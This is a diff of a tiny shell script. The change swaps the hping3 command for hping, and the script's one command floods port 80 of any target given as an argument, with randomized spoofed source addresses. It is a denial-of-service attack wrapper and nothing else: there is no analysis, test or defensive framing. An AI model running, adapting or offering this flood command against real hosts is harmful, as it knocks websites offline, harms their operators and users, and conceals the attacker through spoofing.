@@ -1,2 +1,2 @@
 #!/bin/sh
-hping3  -V --flood --rand-source -p 80 $@
+hping  -V --flood --rand-source -p 80 $@
